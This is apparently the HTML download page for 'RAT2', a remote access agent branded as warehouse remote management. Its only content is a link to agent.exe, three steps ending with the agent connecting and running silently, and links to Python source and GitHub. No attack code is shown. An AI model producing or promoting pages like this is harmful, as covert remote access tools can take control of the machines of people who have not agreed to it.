<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RAT2 - Remote Agent</title>
<style>
  :root {
    --bg:     #0d1117;
    --panel:  #161b22;
    --border: #30363d;
    --accent: #58a6ff;
    --text:   #e6edf3;
    --muted:  #8b949e;
    --green:  #3fb950;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: var(--bg);
    color: var(--text);
    font: 15px/1.6 'Segoe UI', system-ui, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 40px 20px;
  }
  .card {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 48px;
    max-width: 520px;
    width: 100%;
    text-align: center;
  }
  .logo { font-size: 44px; font-weight: 800; letter-spacing: .06em; color: var(--accent); margin-bottom: 8px; }
  .tagline { color: var(--muted); font-size: 14px; margin-bottom: 44px; }
  .primary-btn {
    display: inline-flex;
    align-items: center;
    gap: 10px;
    background: var(--accent);
    color: #000;
    font-weight: 700;
    font-size: 17px;
    padding: 15px 44px;
    border-radius: 10px;
    text-decoration: none;
    transition: opacity .15s;
    margin-bottom: 12px;
  }
  .primary-btn:hover { opacity: .85; }
  .sub-note { color: var(--muted); font-size: 13px; margin-bottom: 44px; }
  .steps {
    text-align: left;
    background: var(--bg);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 24px 28px;
    margin-bottom: 28px;
  }
  .steps h3 { font-size: 11px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: .08em; margin-bottom: 18px; }
  .step { display: flex; gap: 14px; margin-bottom: 14px; align-items: center; }
  .step:last-child { margin-bottom: 0; }
  .step-num { background: var(--green); color: #000; font-weight: 700; font-size: 11px; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
  .step-text { font-size: 14px; }
  .divider { border: none; border-top: 1px solid var(--border); margin: 0 0 20px; }
  .alt-link { font-size: 13px; color: var(--muted); }
  .alt-link a { color: var(--muted); text-decoration: underline; }
  .alt-link a:hover { color: var(--text); }
</style>
</head>
<body>
<div class="card">
  <div class="logo">RAT2</div>
  <div class="tagline">Warehouse Remote Management &mdash; Agent</div>

  <a class="primary-btn" href="/agent.exe" download="agent.exe">
    &#8595;&nbsp; Download agent.exe
  </a>
  <div class="sub-note">Windows &bull; No installation &bull; No setup</div>

  <div class="steps">
    <h3>How to use</h3>
    <div class="step">
      <div class="step-num">1</div>
      <div class="step-text">Download <strong>agent.exe</strong></div>
    </div>
    <div class="step">
      <div class="step-num">2</div>
      <div class="step-text">Double-click it</div>
    </div>
    <div class="step">
      <div class="step-num">3</div>
      <div class="step-text">Done &mdash; it connects and runs silently</div>
    </div>
  </div>

  <hr class="divider">
  <div class="alt-link">
    <a href="/rat2.py" download="rat2.py">Python source</a>
    &nbsp;&bull;&nbsp;
    <a href="https://github.com/ITZV0LT/rat2" target="_blank" rel="noopener">GitHub</a>
  </div>
</div>
</body>
</html>
